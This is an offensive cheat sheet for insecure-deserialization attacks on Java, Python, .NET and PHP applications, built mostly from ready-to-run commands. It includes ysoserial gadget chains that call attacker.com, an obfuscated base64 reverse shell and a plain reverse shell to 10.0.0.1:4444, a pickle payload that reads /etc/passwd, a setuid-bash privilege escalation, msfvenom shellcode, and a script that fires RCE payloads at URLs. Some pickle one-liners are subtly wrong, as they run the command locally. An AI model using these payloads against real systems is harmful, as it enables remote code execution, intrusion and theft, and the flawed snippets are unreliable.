#### 1. BASIC DETECTION
# Java (ysoserial)
java -jar ysoserial.jar CommonsCollections5 'curl attacker.com' | base64 -w0

# Python (pickle)
python3 -c 'import pickle,os; pickle.dumps(os.system("id"))' | xxd

# NET (TypeConfuseDelegate)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64

# PHP (unserialize)
echo 'O:8:"stdClass":1:{s:3:"cmd";s:6:"whoami";}' | base64

#### 2. AUTOMATED TOOLS
# Java: SerialKiller (Safe replacement for ObjectInputStream)
java -jar SerialKiller.jar --config=configuration.xml

# NET: DotNetDeserializationScanner
DotNetDeserializationScanner.exe -u http://target.com/api -d 'base64_payload'

# Universal: GadgetProbe
python3 gadgetprobe.py --url http://target.com/deserialize --data 'test'

#### 3. EXPLOITATION TECHNIQUES
# Java RCE (CommonsCollections)
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' > payload.bin

# Python pickle RCE
python3 -c 'import pickle,os,base64; print(base64.b64encode(pickle.dumps({"malicious": os.system("id")})))'

# NET ViewState
python3 ysoserial.py -p ViewState -g TextFormattingRunProperties -c "calc.exe" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="11451ea8a07e" --isdebug=False

#### 4. BYPASS TECHNIQUES
# Java SignedObject Bypass
java -jar ysoserial.jar SignedObject 'curl attacker.com' | base64

# PHP Type Juggling
a:2:{i:0;O:4:"User":1:{s:8:"username";s:5:"admin";}i:1;O:4:"User":1:{s:8:"username";s:5:"admin";}}

# NET Alphanumeric Shellcode
msfvenom -p windows/exec CMD=calc.exe -f alphanum -b '\x00\x0a\x0d'

#### 5. GADGET CHAIN DETECTION
# Java (GadgetInspector)
java -jar gadget-inspector.jar target.jar

# Python (dill)
python3 -c 'import dill; print(dill.detect.badobjects(dill.loads(payload)))'

# NET (DeserializationChecker)
DeserializationChecker.exe -a TargetAssembly.dll

#### 6. POST-EXPLOITATION
# Reverse Shells
java -jar ysoserial.jar CommonsCollections7 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > payload.ser

# File Write
python3 -c 'import pickle; print(pickle.dumps({"filewrite": open("/etc/passwd").read()}))'

# Privilege Escalation
java -jar ysoserial.jar Spring1 'chmod +s /bin/bash'

#### 7. BLIND DETECTION
# Java DNS Lookup
java -jar ysoserial.jar URLDNS 'http://attacker.com' > payload.bin

# Python Out-of-Band
python3 -c 'import pickle,os; pickle.dumps(os.system("curl attacker.com"))'

# NET HTTP Request
ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "nslookup attacker.com"

#### PRO TIPS:
# 1. Always test:
#  - All serialization endpoints
#  - Different formats (JSON, XML, binary)
#  - Custom serialization implementations
#  - Cryptographically signed objects

# 2. Critical targets:
#  - Java RMI endpoints
#  - NET ViewState
#  - Python pickle loads()
#  - PHP unserialize()

# 3. Escalation paths:
#  - Remote code execution
#  - Authentication bypass
#  - Privilege escalation
#  - Data tampering


# SECURITY IMPACT:
# - Successful deserialization attacks may lead to:
# - Remote code execution
# - Complete system compromise
# - Data corruption
# - Authentication bypass
# - Privilege escalation


#### RECOMMENDED PAYLOADS:
#  - Java: CommonsCollections, Groovy, Jdk7u21
#  - Python: pickle, PyYAML, marshal
#  - NET: ObjectDataProvider, TextFormattingRunProperties
#  - PHP: Phar, custom object injection

#### SAMPLE DETECTION SCRIPT:
```python
# deserial_detector.py
import requests
import base64

def test_java_deserial(url):
    payload = base64.b64encode(open('payload.bin', 'rb').read())
    r = requests.post(url, data=payload, headers={'Content-Type': 'application/java-serialized-object'})
    if 'uid=0(root)' in r.text:
        print("Vulnerable to Java deserialization")

def test_python_pickle(url):
    payload = b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
    r = requests.post(url, data=payload)
    if 'root' in r.text:
        print("Vulnerable to Python pickle")
```
